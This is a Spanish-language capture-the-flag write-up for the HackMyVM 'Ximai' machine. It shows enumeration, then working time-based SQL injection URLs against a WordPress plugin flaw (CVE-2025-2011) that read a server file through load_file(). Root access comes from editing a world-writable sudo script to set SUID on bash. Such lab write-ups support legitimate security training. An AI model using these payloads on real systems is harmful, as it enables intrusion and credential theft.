---
title: "Ximai"
date: 2025-11-27
draft: false
description: "Writeup de la máquina Ximai en HackMyVM."
categories: ["HackMyVM"]
tags:
[
"linux",
"web-enumeration",
"Information Leaked",
"SQLI Time based",
"python-script",
"Hardcoded Credentials",
"sudo-privileges",
]
image: "/images/ximai.png"
---

# Enumeración

Vamos a comenzar como en la mayoría de máquinas identificando la máquina vulnerable con ayuda de **Arp-Scan**:

```bash
arp-scan -I ens33 --localnet --ignoredups
```

![img1](/img/Pasted%20image%2020251125200103.png)

Como podemos observar tenemos la IP de la máquina víctima que será la `192.168.1.89`.

Vamos a realizar un pequeño reconocimiento del sistema mediante el comando `ping` de la siguiente manera:

```bash
ping -c 1 192.168.1.89
```

![img2](/img/Pasted%20image%2020251125200727.png)

Como podemos observar tenemos un `ttl=64` donde podemos comenzar a suponer un sistema Linux.

Ahora vamos a realizar un pequeño escaneo con ayuda de **Nmap**, el objetivo será identificar los puertos abiertos:

```bash
nmap -p- --open -sS --min-rate 5000 -n -v -Pn 192.168.1.89 -oG allPorts
```

![img3](/img/Pasted%20image%2020251125201310.png)

Podemos observar que tenemos los puertos: `22,80,3306,8000` abiertos, con esto claro vamos a realizar un segundo escaneo a estos puertos en específico para obtener un poco más de información:

```bash
nmap -p22,80,3306,8000 -sCV 192.168.1.89 -oN target
```

![img4](/img/Pasted%20image%2020251125201917.png)

Ya podemos observar los servicios, donde en este caso los servicios que más llaman mi atención son el del puerto `80 y 8000` por lo que vamos a analizar primero el puerto `80` con ayuda de whatweb:

```bash
whatweb http://192.168.1.89
```

![img5](/img/Pasted%20image%2020251125202804.png)

Como podemos observar de primeras vemos la versión de apache y que al parecer es un Linux Debian, pero no más.

Al ver que no tenemos mucha más información lo que vamos a hacer es con ayuda de **Gobuster** buscar por más directorios en la web:

```bash
gobuster dir -u http://192.168.1.89 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20
```

![img6](/img/Pasted%20image%2020251125203133.png)

Como podemos observar en este caso no encontramos directorios, pero vamos a buscar por directorios con extensiones como `.php o .html` a ver que logramos encontrar:

```bash
gobuster dir -u http://192.168.1.89 -w /usr/share/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-medium.txt -t 20 -x php,html
```

![img7](/img/Pasted%20image%2020251125203540.png)

Vemos que esta vez nos fue mucho mejor, ya que tenemos rutas comprometedoras, pero una llama la atención que es la de `reminder.php`:

![img8](/img/Pasted%20image%2020251125203919.png)

Podemos observar la siguiente web que nos indica algunas cosas clave como:

- Posible usuario `jimmy`.
- Problemas en un buscador, nos indica una mala configuración de la base de datos y el cómo intuimos que tenemos una base de datos es porque detectamos a `MySQL` corriendo con ayuda de **Nmap**.
- Una posible ruta que contiene la contraseña del usuario `jimmy`.

Tomando esto en cuenta podemos analizar el código fuente de la web:

![img9](/img/Pasted%20image%2020251125204132.png)

Podemos observar como la imagen se carga de una ruta algo inusual y conociendo que posiblemente tenemos escondida la ruta con las credenciales del usuario `jimmy` podemos intentar ver si este directorio tiene permisos de listarse:

![img10](/img/Pasted%20image%2020251125204315.png)

Podemos observar que si tiene permisos y vemos un archivo `creds.txt` el cual contiene lo siguiente:

![img11](/img/Pasted%20image%2020251125204349.png)

Al parecer podremos ver el contenido de `creds.txt` dentro de `/etc/jimmy.txt`.

No lograremos encontrar nada más corriendo en este servicio.

Vamos a comenzar ahora a enumerar el servicio web que corre en el puerto `8000`, primero con un **Whatweb** a ver si logramos identificar algunas tecnologías:

```bash
whatweb http://192.168.1.89:8000
```

![img12](/img/Pasted%20image%2020251125204618.png)

Como podemos observar ya tenemos información de que la web corre en `Apache` y algo que llama la atención es que es un CMS específicamente un WordPress.

Podemos Visitar la web a ver que logramos encontrar dentro de la misma:

![img13](/img/Pasted%20image%2020251125204947.png)

Vemos la web, pero parece que no tiene nada interesante ni nos lleva a nada interesante.

En este punto y considerando que hemos encontrado que es un CMS con WordPress, podemos intentar hacer un escaneo con **Nuclei** de la siguiente manera:

```bash
nuclei -target http://192.168.1.89:8000/
```

![img14](/img/Pasted%20image%2020251126165242.png)

ComO podemos observar tenemos una vulnerabilidad conocida que es el CVE-2025-2011 la cual ya tiene documentación para explotar.

# Explotación

En mi caso me gusta hacer las cosas de forma manual por lo que vamos a ver que ya nos brinda información sobre la inyección así que vamos a adaptarla, en este caso fue necesario la siguiente inyección basada en tiempo:

```bash
http://192.168.1.89:8000/wp-admin/admin-ajax.php?s=9999%27)%20and%20(select%201234%20from%20(select%20sleep(3))x)%20--%20-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index
```

![img15](/img/Pasted%20image%2020251126175739.png)

En este caso vamos a ver como es que la inyección es válida porque la web demora un estimado muy cercano a los 3 segundos que le indicamos en cargar, por lo que ya tenemos la inyección de forma exitosa, en este punto lo que vamos a hacer es jugar con condiciones, ya que el objetivo es ir obteniendo información a partir de ellas:

```bash
http://192.168.1.89:8000/wp-admin/admin-ajax.php?s=9999%27)%20and%20(select%201234%20from%20(select%20if(substring(%27hola%27,1,1)=%27h%27,%20sleep(5),0))x)%20--%20-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index
```

![img16](/img/Pasted%20image%2020251126180154.png)

Esto sigue funcionando y lo que hace precisamente es descomponer `hola` y filtrar por la primera letra que es la letra `h`, luego dice si `h=h` entonces ejecuta el `sleep(5)` y si no, pues retorna un 0.
Esta query también verifica si es correcto, y ya tendríamos algo valido que podemos usar para recuperar información, por lo tanto lo que vamos a hacer es ahora intentar obtener la versión de la base de datos para validar que nos acepta datos internos:

```bash
http://192.168.1.89:8000/wp-admin/admin-ajax.php?s=9999%27)%20and%20(select%201234%20from%20(select%20if(substring((select%20@@version),1,1)=%271%27,%20sleep(3),0))x)%20--%20-&perpage=20&page=1&orderBy=source_id&dateEnd&dateStart&order=DESC&sources&action=depicter-lead-index
```

![img17](/img/Pasted%20image%2020251126180658.png)

Excelente esto funciona, ahora algo que se intentaría es comenzar a enumerar cosas como las bases de datos tablas y columnas, pero en este caso no, tenemos que prestar mucha atención a las pistas, recordemos que tenemos un archivo con las credenciales de `jimmy` en la ruta `/etc/jimmy.txt` vamos a intentar cargar ese archivo con la función `load_file()` y reconstruir el contenido del mismo letra por letra, para esto vamos a jugar también con `group_concat` para compactar todo el texto en una sola línea y como esto puede ser muy tardado de forma manual lo hemos automatizado con ayuda de python, lo pueden clonar de mi [**GitHub**<svg xmlns="http://www.w3.org/2000/svg" height="30" width="30" viewBox="0 0 640 440"><!--!Font Awesome Free v7.1.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free Copyright 2025 Fonticons, Inc.--><path fill="#ffffff" d="M237.9 461.4C237.9 463.4 235.6 465 232.7 465C229.4 465.3 227.1 463.7 227.1 461.4C227.1 459.4 229.4 457.8 232.3 457.8C235.3 457.5 237.9 459.1 237.9 461.4zM206.8 456.9C206.1 458.9 208.1 461.2 211.1 461.8C213.7 462.8 216.7 461.8 217.3 459.8C217.9 457.8 216 455.5 213 454.6C210.4 453.9 207.5 454.9 206.8 456.9zM251 455.2C248.1 455.9 246.1 457.8 246.4 460.1C246.7 462.1 249.3 463.4 252.3 462.7C255.2 462 257.2 460.1 256.9 458.1C256.6 456.2 253.9 454.9 251 455.2zM316.8 72C178.1 72 72 177.3 72 316C72 426.9 141.8 521.8 241.5 555.2C254.3 557.5 258.8 549.6 258.8 543.1C258.8 536.9 258.5 502.7 258.5 481.7C258.5 481.7 188.5 496.7 173.8 451.9C173.8 451.9 162.4 422.8 146 415.3C146 415.3 123.1 399.6 147.6 399.9C147.6 399.9 172.5 401.9 186.2 425.7C208.1 464.3 244.8 453.2 259.1 446.6C261.4 430.6 267.9 419.5 275.1 412.9C219.2 406.7 162.8 398.6 162.8 302.4C162.8 274.9 170.4 261.1 186.4 243.5C183.8 237 175.3 210.2 189 175.6C209.9 169.1 258 202.6 258 202.6C278 197 299.5 194.1 320.8 194.1C342.1 194.1 363.6 197 383.6 202.6C383.6 202.6 431.7 169 452.6 175.6C466.3 210.3 457.8 237 455.2 243.5C471.2 261.2 481 275 481 302.4C481 398.9 422.1 406.6 366.2 412.9C375.4 420.8 383.2 435.8 383.2 459.3C383.2 493 382.9 534.7 382.9 542.9C382.9 549.4 387.5 557.3 400.2 555C500.2 521.8 568 426.9 568 316C568 177.3 455.5 72 316.8 72zM169.2 416.9C167.9 417.9 168.2 420.2 169.9 422.1C171.5 423.7 173.8 424.4 175.1 423.1C176.4 422.1 176.1 419.8 174.4 417.9C172.8 416.3 170.5 415.6 169.2 416.9zM158.4 408.8C157.7 410.1 158.7 411.7 160.7 412.7C162.3 413.7 164.3 413.4 165 412C165.7 410.7 164.7 409.1 162.7 408.1C160.7 407.5 159.1 407.8 158.4 408.8zM190.8 444.4C189.2 445.7 189.8 448.7 192.1 450.6C194.4 452.9 197.3 453.2 198.6 451.6C199.9 450.3 199.3 447.3 197.3 445.4C195.1 443.1 192.1 442.8 190.8 444.4zM179.4 429.7C177.8 430.7 177.8 433.3 179.4 435.6C181 437.9 183.7 438.9 185 437.9C186.6 436.6 186.6 434 185 431.7C183.6 429.4 181 428.4 179.4 429.7z"/></svg>](<https://github.com/danystarrkk/Hacknig-Tools/tree/main/Tools/SQLI%20Brute%20Force%20(Ximai)>)

Si ya tenemos el script es cuestión de clonarlo y ejecutarlo:

```bash
python3 SQLI-TimeBased.py -u http://192.168.1.89:8000 -f /etc/jimmy.txt
```

![img1](/img/Pasted%20image%2020251129151119.png)

El script comienza a hacer la inyección y en este punto vamos a esperar al resultado que sería:

![img2](/img/Pasted%20image%2020251129151152.png)

Podemos observar ya el contenido y lo que posiblemente sea la contraseña del usuario jimmy.

Recordemos que tenemos habilitado el servicio ssh por lo que vamos a intentar una conexión con ayuda de esta contraseña de la siguiente manera:

```bash
ssh jimmy@192.168.1.89
```

![img20](/img/Pasted%20image%2020251126182349.png)

Ya estamos como el usuario `jimmy`.
Por alguna razón parece estar dañado el comando `ls` y no, no los permite de forma relativa, pero de manera absoluta lo podemos ejecutar y ver la flag dentro de `/home/jimmy`:
![img21](/img/Pasted%20image%2020251126182625.png)

# Escalada de Privilegios

Bueno se intentó varios métodos de enumeración, pero no encontramos nada por el momento, ahora lo que vamos a intentar en este punto es conociendo que tenemos las webs corriendo y la ruta de archivos usual es `/var/www` vamos a buscar por archivos de configuración a ver si encontramos algo:

![img22](/img/Pasted%20image%2020251126185216.png)

Encontramos ese archivo y si investigamos dentro del mismo podemos observar lo siguiente:

![img23](/img/Pasted%20image%2020251126185252.png)

Vemos credenciales, esto es bueno, vamos a ver si podemos ya ingresar como el usuario `adminer`:

![img24](/img/Pasted%20image%2020251126185338.png)

Perfecto, ahora vamos a ver si tenemos algún permiso con `sudo -l`:

![img25](/img/Pasted%20image%2020251126185404.png)

Podemos usar el comando grep, podemos intentar usar `gtf-obins` para ver si podemos vulnerar esto:

![img26](/img/Pasted%20image%2020251126185449.png)

Al parecer si es posible por lo que vamos a intentar escalar privilegios:

![img27](/img/Pasted%20image%2020251126185733.png)

No funciona y es debido a que no es el binario `grep` si no un script que directamente imprime el mensaje, pero esto es mejor podemos,ya que dar instrucciones dentro del mismo si tenemos permisos de escritura:

![img28](/img/Pasted%20image%2020251126185818.png)

Vemos que otros tiene todos los permisos por lo que vamos a modificarlo:

![img29](/img/Pasted%20image%2020251126185908.png)

Hacemos que se ejecuten permisos de SUID a la bash y ahora intentamos ejecutar grep a ver que sucede:
![img30](/img/Pasted%20image%2020251126190006.png)

Perfecto ya tenemos permisos SUID en la bash y es cuestión de ejecutar el comando:

```bash
bash -p
```

![img31](/img/Pasted%20image%2020251126190051.png)

ya podemos obtener la última flag:

![img32](/img/Pasted%20image%2020251126190113.png)

Lab Terminado.
